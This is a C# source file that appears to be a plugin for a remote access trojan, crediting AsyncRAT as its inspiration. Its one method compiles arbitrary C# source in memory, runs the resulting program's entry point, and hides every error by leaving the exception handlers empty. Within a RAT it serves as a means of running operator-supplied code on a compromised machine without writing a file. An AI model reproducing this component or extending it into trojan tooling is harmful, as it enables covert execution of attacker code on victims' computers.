using System;
using System.CodeDom.Compiler;
using System.Reflection;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : AsyncRAT ||
*/


namespace Plugin
{
    internal class DotNetCode
    {
        internal static void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies, string compilerOptions)
        {
            try
            {
                var compilerParameters = new CompilerParameters(referencedAssemblies)
                {
                    GenerateExecutable = true,
                    GenerateInMemory = true,
                    CompilerOptions = compilerOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false,
                };
                var compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source);

                if (compilerResults.Errors.Count > 0)
                {

                }
                else
                {
                    Assembly assembly = compilerResults.CompiledAssembly;
                    MethodInfo methodInfo = assembly.EntryPoint;
                    object injObj = assembly.CreateInstance(methodInfo.Name);
                    object[] parameters = new object[1];
                    if (methodInfo.GetParameters().Length == 0)
                    {
                        parameters = null;
                    }
                    methodInfo.Invoke(injObj, parameters);
                }
            }
            catch (Exception)
            {
            }
        }
    }
}
